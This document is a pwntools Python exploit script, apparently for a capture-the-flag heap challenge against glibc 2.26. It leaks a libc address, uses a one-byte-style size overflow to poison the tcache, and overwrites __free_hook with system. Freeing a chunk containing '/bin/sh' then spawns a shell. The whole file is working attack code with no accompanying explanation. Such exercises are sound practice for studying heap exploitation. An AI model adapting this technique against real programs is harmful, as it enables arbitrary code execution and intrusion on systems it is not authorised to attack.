from pwn import *

elf = ELF("./pwn")
libc = ELF("/home/***/pwn/glibc-all-in-one/libs/2.26-0ubuntu2_amd64/libc-2.26.so")
context(arch=elf.arch, os=elf.os)
context.log_level = "debug"
p = process([elf.path])


def add_chunk(index, size):
    p.sendafter("choice:", "1")
    p.sendafter("index:", str(index))
    p.sendafter("size:", str(size))


def delete_chunk(index):
    p.sendafter("choice:", "2")
    p.sendafter("index:", str(index))


def edit_chunk(index, content):
    p.sendafter("choice:", "3")
    p.sendafter("index:", str(index))
    p.sendafter("length:", str(len(content)))
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendafter("choice:", "4")
    p.sendafter("index:", str(index))


gdb.attach(p)
# pause()

# 泄露libc地址
add_chunk(0, 0x410)
add_chunk(1, 0x20)
delete_chunk(0)
add_chunk(0, 0x410)
show_chunk(0)

p.recvline()
# tmp = u64(p.recvuntil(b'\x7f').ljust(0x8, b'\x00'))
# print(f"tmp = {hex(tmp)}")
libc.address = u64(p.recvuntil(b"\x7f").ljust(0x8, b"\x00")) - 0x3DAC78
print(f"libc.address = {hex(libc.address)}")

# 3 chunks
add_chunk(0, 0x18)
add_chunk(1, 0x18)
add_chunk(2, 0x18)

# chunk0 overflow -> chunk1 size
edit_chunk(0, b"a" * 0x18 + p64(0x100))
# chunk1 -> tcache[0x100]
delete_chunk(1)
# chunk1 size == 0x100
add_chunk(1, 0xF8)

# chunk2 -> tcache[0x20]
delete_chunk(2)
# chunk2 UAF
edit_chunk(1, b"a" * 0x20 + p64(libc.sym["__free_hook"]))

add_chunk(2, 0x18)
add_chunk(2, 0x18) # -> __free_hook
edit_chunk(2, p64(libc.sym["system"]))
edit_chunk(0, b"/bin/sh\x00")

# get shell
delete_chunk(0)

p.interactive()
